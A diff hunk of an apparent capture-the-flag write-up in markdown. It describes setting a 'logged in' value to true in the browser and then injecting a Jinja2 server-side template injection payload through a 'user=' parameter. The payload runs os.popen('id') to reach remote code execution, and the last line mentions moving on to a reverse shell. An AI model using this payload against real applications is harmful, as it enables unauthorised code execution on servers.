@@ -29,7 +29,8 @@ Change logged in to true and save it in the browser
 ![[Pasted image 20231011154905.png]]
 Use the "user=" parameter to inject the ssti payload and achieve a RCE
 ```python
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen("id").read()}}
 ```
+Usa il payload url encodato
 ![[Pasted image 20231011155050.png]]
 Now use the rce to obtain a reverse shell
